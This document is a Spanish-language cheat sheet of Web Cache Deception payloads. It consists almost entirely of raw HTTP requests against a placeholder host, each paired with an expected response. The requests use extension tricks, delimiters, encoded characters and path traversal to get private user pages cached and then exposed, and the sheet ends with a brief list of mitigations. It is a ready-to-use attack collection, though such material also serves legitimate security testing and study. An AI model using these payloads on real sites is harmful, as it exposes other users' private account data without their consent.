# 🫀 Real world Payloads

## Web Cache Deception (WCD)

### Manipulación de Extensiones para Engaño en Caché

#### Payloads Básicos

```http
GET /dashboard/profile.css HTTP/1.1
Host: target.com
```

```http
GET /orders/details.jpg HTTP/1.1
Host: target.com
```

```http
GET /profile.js HTTP/1.1
Host: target.com
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
Content-Type: text/html

<h1>Información privada del usuario</h1>
```

***

### Identificación de Respuestas en Caché

#### Revisar Encabezados

```http
GET /dashboard HTTP/1.1
Host: target.com
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
X-Cache: miss
Cache-Control: no-cache

<h1>Panel del usuario</h1>
```

Realiza la misma solicitud nuevamente:

```http
GET /dashboard HTTP/1.1
Host: target.com
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
X-Cache: hit
Cache-Control: public, max-age=3600

<h1>Panel del usuario</h1>
```

***

### Exploitar Discrepancias de Mapeo

#### Prueba de Mapeo REST vs Estático

```http
GET /user/123/profile/wcd.css HTTP/1.1
Host: target.com
```

**Respuesta esperada**

*   **Servidor de Origen (REST):**

    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html

    Información del perfil del usuario 123
    ```
*   **Caché (Estático):**

    ```http
    HTTP/1.1 200 OK
    Content-Type: text/css

    Información del perfil del usuario 123 (almacenado como .css)
    ```

***

### Uso de Cache Buster

#### Ejemplo con Parámetro Dinámico

```http
GET /dashboard?_cachebuster=12345 HTTP/1.1
Host: target.com
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600

<h1>Panel del usuario</h1>
```

***

### Prueba de Delimitadores

#### Uso de Delimitadores para Manipulación

```http
GET /settings/users/list;aaa.js HTTP/1.1
Host: target.com
```

**Respuesta esperada**

*   **Caché:**

    ```http
    HTTP/1.1 200 OK
    Content-Type: application/javascript

    Información sensible del usuario
    ```
*   **Servidor de Origen:**

    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html

    Información sensible del usuario
    ```

***

### Explotación de Decodificación

#### Prueba con Caracteres Codificados

```http
GET /profile%23wcd.css HTTP/1.1
Host: target.com
```

**Respuesta esperada**

*   **Servidor de Origen:**

    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html

    Información del perfil del usuario
    ```
*   **Caché:**

    ```http
    HTTP/1.1 200 OK
    Content-Type: text/css

    Información del perfil del usuario
    ```

***

### Explotación de Reglas de Directorios Estáticos

#### Solicitud Maliciosa

```http
GET /static/../profile.js HTTP/1.1
Host: target.com
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
Content-Type: application/javascript

Información sensible del perfil del usuario
```

***

### Explotación de Normalización

#### Payload de Travesía de Ruta

```http
GET /static/..%2fprofile HTTP/1.1
Host: target.com
```

**Respuesta esperada**

*   **Caché:**

    ```http
    HTTP/1.1 200 OK
    Content-Type: text/html

    Información sensible del perfil del usuario
    ```

***

### Mitigaciones

* Implementar encabezados como `Cache-Control: private` para respuestas sensibles.
* Validar extensiones de archivos y rutas.
* Evitar el uso de delimitadores inconsistentes entre el servidor de origen y el caché.
* Asegurar la coherencia en la normalización de rutas y el manejo de caracteres codificados.
